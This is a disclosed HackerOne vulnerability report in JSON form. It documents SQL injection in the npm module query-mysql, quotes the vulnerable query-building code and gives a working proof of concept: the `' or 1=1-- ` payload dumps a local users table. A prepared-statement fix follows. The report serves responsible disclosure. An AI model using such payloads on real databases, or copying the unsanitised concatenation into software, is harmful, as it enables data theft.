{
  "id": 311244,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTEyNDQ=",
  "url": "https://hackerone.com/reports/311244",
  "title": "[query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-02-01T00:58:42.031Z",
  "submitted_at": "2018-02-01T00:58:42.031Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3754"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-05-19T12:53:02.893Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-05-18T18:46:52.627Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\nThere is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database.\n\n## Module\n\n**query-mysql**\n\nInstall this module in your project like dependency\n\nhttps://www.npmjs.com/package/query-mysql\n\nversion: 0.0.2\n\nStats\n0 downloads in the last day\n13 downloads in the last week\n85 downloads in the last month\n\n~1000 estimated downloads per year\n\n\n## Description\n\nMost of functions in ```query-mysql``` module used to manipulate data build query usign simple string concatenation. This leads to SQL Injection vulnerability, because an attacker is able to pass his own query and run any SQL on the database.\n\nThis is one of those functions, which allows to select record from the table depends on value for the column:\n\n```javascript\n// node_modules/query-mysql/lib/base.js, line 172\n    fetchById: function (table, id, name_id, callback) {\n        connect(function (connected) {\n            if (connected) {\n\n                connection.query(\"SELECT * FROM \" + table + \" WHERE \" +name_id+\"='\"+ id+\"'\", function (err, rows, fields) {\n                    connection.end();\n                    console.log(\"fetchById\");\n                    //if (err) throw err;\n                    if (err) {\n                        callback(\"error\", null);\n                    }else{\t\t\t\t\t\t\n                        callback(\"success\", rows);\n                    };\n                })\n\n            }else{\n                callback(\"error_connection\", null);\n            };\n        })\n    },\n```\n\nThe query itself is simple string with values passed by the user concatenated with SQL:\n\n```javascript\nconnection.query(\"SELECT * FROM \" + table + \" WHERE \" +name_id+\"='\"+ id+\"'\"\n```\n\nIf we assume, that ```table```, ```name_id``` and ```id``` will be passed as, respectively, ```users```, ```id``` and ```1```, we should get following query:\n\n```sql\nSELECT * FROM users WHERE id='1'\n```\nIt returns record from table ```users```, where ```id``` equals 1.\n\nNow, if we pass in ```id``` malicious query, like ```1\\' OR 1=1-- ``` - we get this:\n\n```sql\nSELECT * FROM users WHERE id='1' OR 1=1-- \n```\nThis query returns **all** records from table ```users```\n\n\n## Mitigation\n\n```query-mysql``` relies on ```mysql``` module. This module allows to use Preparing Queries (Prepared Statements) - https://www.npmjs.com/package/mysql#preparing-queries:\n\n```\nYou can use mysql.format to prepare a query with multiple insertion points, utilizing the proper escaping for ids and values. A simple example of this follows:\n\nvar sql = \"SELECT * FROM ?? WHERE ?? = ?\";\nvar inserts = ['users', 'id', userId];\nsql = mysql.format(sql, inserts);\n\nFollowing this you then have a valid, escaped query that you can then send to the database safely. This is useful if you are looking to prepare the query before actually sending it to the database. As \n```\n\nThis is the simplest way to avoid simple SQL Injection vulnerabilites.\n\n## Steps To Reproduce:\n\n- install ```query-mysql``` module:\n\n```\n$ npm install query-mysql\n```\n\n- log in to your local MySQL instance and create database ```test``` using following SQL:\n\n```sql\n-- Table structure for table `users`\n\nDROP TABLE IF EXISTS `users`;\n/*!40101 SET @saved_cs_client     = @@character_set_client */;\n/*!40101 SET character_set_client = utf8 */;\nCREATE TABLE `users` (\n  `username` varchar(50) DEFAULT NULL,\n  `password` varchar(50) DEFAULT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n- populate data by adding couple of records:\n\n```\nmysql> select * from users;\n+----------+----------+\n| username | password |\n+----------+----------+\n| admin    | admin    |\n| user     | user     |\n| noob     | noob     |\n+----------+----------+\n3 rows in set (0.00 sec)\n```\n\n\n- create sample application:\n\n```javascript\n// app.js\n'use strict'\n\nconst query = require('query-mysql')\n\nquery.configure({\n  'host': '127.0.0.1',\n  'user': 'root',\n  'password': 'root',\n  'database': 'test'\n})\n\nquery.base.fetchById('users', 'noob', 'username', (msg, res) => {\n  console.log(msg, res)\n})\n```\n\n- run application:\n\n```\n$ node app.js\n```\n\n- result:\n\n```\nfetchById\nsuccess [ RowDataPacket { username: 'noob', password: 'noob' } ]\n```\n\n- Now, modify query into following one:\n\n```javascript\n// app.js\n//... cut for readibility\nquery.base.fetchById('users', 'noob\\' or 1=1-- ', 'username', (msg, res) => {\n  console.log(msg, res)\n})\n```\n\n- run application again:\n\n```\n$ node app.js\n```\n\n- this time result set contains all records from table ```users```:\n\n```\nfetchById\nsuccess [ RowDataPacket { username: 'admin', password: 'admin' },\n  RowDataPacket { username: 'user', password: 'user' },\n  RowDataPacket { username: 'noob', password: 'noob' } ]\n```\n\nOther functions in ```query-mysql``` module contains the same vulnerability. \n\n## Supporting Material/References:\n\n\n- macOS 10.13.3\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.3\n- npm version: 5.5.1\n- mysql  Ver 14.14 Distrib 5.7.13, for osx10.11 (x86_64)\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to fetch/manipulate data in database",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-06-17T18:46:52.741Z",
  "allow_singular_disclosure_after": -178567874.24203888,
  "singular_disclosure_allowed": true,
  "vote_count": 13,
  "voters": [
    "s_p_q_r",
    "apapedulimu",
    "eveeez",
    "hussain_0x3c",
    "lordjerry0x01",
    "linkks",
    "sh3r1",
    "0x08",
    "nims_0110",
    "testinghacker0x01",
    "and 3 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
